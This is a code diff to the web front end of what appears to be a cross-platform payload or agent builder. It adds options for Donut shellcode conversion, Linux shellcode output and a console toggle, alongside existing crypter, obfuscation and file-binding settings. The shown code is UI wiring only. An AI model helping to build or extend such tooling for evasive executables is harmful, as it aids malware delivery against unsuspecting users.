@@ -145,6 +145,9 @@ function collectFormSettings() {
     assemblyCopyright: document.getElementById("assembly-copyright")?.value ?? "",
     outputExtension: document.getElementById("output-extension")?.value ?? ".exe",
     cryptableMode: document.getElementById("cryptable-mode")?.checked ?? false,
+    useDonut: document.getElementById("donut-mode")?.checked ?? false,
+    useLinuxShellcode: document.getElementById("linux-shellcode-mode")?.checked ?? false,
+    shellcodeConsole: document.getElementById("shellcode-console")?.checked ?? false,
   };
 }
 
@@ -202,6 +205,15 @@ function applyFormSettings(settings) {
   if (settings.assemblyCopyright !== undefined) setVal("assembly-copyright", settings.assemblyCopyright);
   if (settings.outputExtension !== undefined) setVal("output-extension", settings.outputExtension);
   if (settings.cryptableMode !== undefined) setCb("#cryptable-mode", settings.cryptableMode);
+  if (settings.useDonut !== undefined) {
+    setCb("#donut-mode", settings.useDonut);
+    if (settings.useDonut) applyDonutMode(true);
+  }
+  if (settings.useLinuxShellcode !== undefined) {
+    setCb("#linux-shellcode-mode", settings.useLinuxShellcode);
+    if (settings.useLinuxShellcode) applyLinuxShellcodeMode(true);
+  }
+  if (settings.shellcodeConsole !== undefined) setCb("#shellcode-console", settings.shellcodeConsole);
 
   const restoredObfuscate = document.querySelector('input[name="obfuscate"]');
   const garbleContainer = document.getElementById("garble-settings-container");
@@ -657,6 +669,26 @@ if (cryptableCheckbox) {
     applyCryptableMode(true);
   }
 }
+
+const donutCheckbox = document.getElementById("donut-mode");
+if (donutCheckbox) {
+  donutCheckbox.addEventListener("change", () => { applyDonutMode(donutCheckbox.checked); });
+  if (donutCheckbox.checked) applyDonutMode(true);
+}
+
+const linuxScCheckbox = document.getElementById("linux-shellcode-mode");
+if (linuxScCheckbox) {
+  linuxScCheckbox.addEventListener("change", () => { applyLinuxShellcodeMode(linuxScCheckbox.checked); });
+  if (linuxScCheckbox.checked) applyLinuxShellcodeMode(true);
+}
+
+document.querySelectorAll('input[name="platform"]').forEach((el) => {
+  el.addEventListener("change", () => {
+    updateShellcodeCheckboxVisibility();
+    if (donutCheckbox?.checked) applyDonutMode(true);
+    if (linuxScCheckbox?.checked) applyLinuxShellcodeMode(true);
+  });
+});
 
 let pendingIconBase64 = null;
 const iconUpload = document.getElementById("icon-upload");
@@ -1395,6 +1427,9 @@ form?.addEventListener("submit", async (e) => {
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
     iosBundleId: platforms.some(p => p.startsWith('ios-')) ? (form.querySelector("#ios-bundle-id")?.value.trim() || undefined) : undefined,
+    useDonut: document.getElementById("donut-mode")?.checked || false,
+    useLinuxShellcode: document.getElementById("linux-shellcode-mode")?.checked || false,
+    shellcodeConsole: document.getElementById("shellcode-console")?.checked || false,
   };
 
   const hasAndroid = platforms.some(p => p.startsWith('android-'));
